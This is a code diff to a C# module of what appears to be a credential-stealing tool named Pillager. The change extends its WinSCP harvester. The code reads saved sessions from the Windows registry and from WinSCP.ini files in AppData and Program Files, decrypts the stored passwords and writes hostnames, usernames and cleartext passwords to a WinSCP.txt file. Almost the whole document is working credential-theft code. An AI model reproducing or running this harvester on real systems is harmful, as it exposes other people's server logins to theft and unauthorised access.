@@ -1,13 +1,14 @@
-﻿using System.IO;
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
 using System.Text;
 using Microsoft.Win32;
+using Pillager.Helper;
 
 namespace Pillager.FTPs
 {
-    internal class WinSCP
+    internal class WinSCP : ICommand
     {
-        public static string FTPName = "WinSCP";
-
         static readonly int PW_MAGIC = 0xA3;
         static readonly char PW_FLAG = (char)0xFF;
 
@@ -17,7 +18,7 @@ namespace Pillager.FTPs
             public string remainingPass;
         }
 
-        private static Flags DecryptNextCharacterWinSCP(string passwd)
+        private Flags DecryptNextCharacterWinSCP(string passwd)
         {
             Flags Flag;
             string bases = "0123456789ABCDEF";
@@ -30,7 +31,7 @@ namespace Pillager.FTPs
             return Flag;
         }
 
-        private static string DecryptWinSCPPassword(string Host, string userName, string passWord)
+        private string DecryptWinSCPPassword(string Host, string userName, string passWord)
         {
             var clearpwd = string.Empty;
             char length;
@@ -65,33 +66,108 @@ namespace Pillager.FTPs
             return clearpwd;
         }
 
-        public static string GetInfo()
+        static string ProgramFilesx86()
+        {
+            if (8 == IntPtr.Size
+                || (!String.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432"))))
+            {
+                return Environment.GetEnvironmentVariable("ProgramFiles(x86)");
+            }
+
+            return Environment.GetEnvironmentVariable("ProgramFiles");
+        }
+
+        public string GetInfo()
         {
             StringBuilder sb = new StringBuilder();
             string registry = @"Software\Martin Prikryl\WinSCP 2\Sessions";
             var registryKey = Registry.CurrentUser.OpenSubKey(registry);
-            if (registryKey == null) return "";
-            foreach (string rname in registryKey.GetSubKeyNames())
+            if (registryKey != null)
             {
-                using (var session = registryKey.OpenSubKey(rname))
+                foreach (string rname in registryKey.GetSubKeyNames())
                 {
-                    if (session != null)
+                    using (var session = registryKey.OpenSubKey(rname))
                     {
-                        string hostname = (session.GetValue("HostName") != null) ? session.GetValue("HostName").ToString() : "";
-                        if (!string.IsNullOrEmpty(hostname))
+                        if (session != null)
                         {
-                            try
+                            string hostname = (session.GetValue("HostName") != null) ? session.GetValue("HostName").ToString() : "";
+                            if (!string.IsNullOrEmpty(hostname))
                             {
-                                string username = session.GetValue("UserName").ToString();
-                                string password = session.GetValue("Password").ToString();
-                                sb.AppendLine("hostname: "+ hostname);
-                                sb.AppendLine("username: " + username);
-                                sb.AppendLine("rawpass: " + password);
-                                sb.AppendLine("password: " + DecryptWinSCPPassword(hostname, username, password));
+                                try
+                                {
+                                    string username = session.GetValue("UserName").ToString();
+                                    string password = session.GetValue("Password").ToString();
+                                    sb.AppendLine("hostname: " + hostname);
+                                    sb.AppendLine("username: " + username);
+                                    sb.AppendLine("rawpass: " + password);
+                                    sb.AppendLine("password: " + DecryptWinSCPPassword(hostname, username, password));
+                                    sb.AppendLine();
+                                }
+                                catch
+                                { }
                             }
-                            catch
-                            { }
                         }
+                    }
+                }
+            }
+            string inipath1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "WinSCP.ini");
+            if (File.Exists(inipath1))
+            {
+                Pixini pixini = Pixini.Load(inipath1);
+                Dictionary<string, List<IniLine>> sectionMap = pixini.sectionMap;
+                foreach (var item in sectionMap)
+                {
+                    if (item.Key.ToLower().StartsWith("sessions"))
+                    {
+                        string host = "";
+                        string user = "";
+                        string password = "";
+                        List<IniLine> iniLines = item.Value;
+                        foreach (var line in iniLines)
+                        {
+                            if (line.key == null) continue;
+                            if (line.key.ToLower() == "hostname") host = line.value;
+                            if (line.key.ToLower() == "username") user = line.value;
+                            if (line.key.ToLower() == "password") password = line.value;
+                        }
+                        if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(user))
+                            password = DecryptWinSCPPassword(host, user, password);
+
+                        sb.AppendLine("hostname: " + host);
+                        sb.AppendLine("username: " + user);
+                        sb.AppendLine("password: " + password);
+                        sb.AppendLine();
+                    }
+                }
+            }
+            string inipath2 = Path.Combine(ProgramFilesx86(), "WinSCP.ini");
+
+            if (File.Exists(inipath2))
+            {
+                Pixini pixini = Pixini.Load(inipath2);
+                Dictionary<string, List<IniLine>> sectionMap = pixini.sectionMap;
+                foreach (var item in sectionMap)
+                {
+                    if (item.Key.ToLower().StartsWith("sessions"))
+                    {
+                        string host = "";
+                        string user = "";
+                        string password = "";
+                        List<IniLine> iniLines = item.Value;
+                        foreach (var line in iniLines)
+                        {
+                            if (line.key == null) continue;
+                            if (line.key.ToLower() == "hostname") host = line.value;
+                            if (line.key.ToLower() == "username") user = line.value;
+                            if (line.key.ToLower() == "password") password = line.value;
+                        }
+                        if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(user))
+                            password = DecryptWinSCPPassword(host, user, password);
+
+                        sb.AppendLine("hostname: " + host);
+                        sb.AppendLine("username: " + user);
+                        sb.AppendLine("password: " + password);
+                        sb.AppendLine();
                     }
                 }
             }
@@ -100,16 +176,16 @@ namespace Pillager.FTPs
             return sb.ToString();
         }
 
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
                 string output = GetInfo();
                 if (!string.IsNullOrEmpty(output))
                 {
-                    string savepath = Path.Combine(path, FTPName);
+                    string savepath = Path.Combine(path, "WinSCP");
                     Directory.CreateDirectory(savepath);
-                    File.WriteAllText(Path.Combine(savepath, FTPName + ".txt"), output);
+                    File.WriteAllText(Path.Combine(savepath, "WinSCP.txt"), output, Encoding.UTF8);
                 }
             }
             catch { }
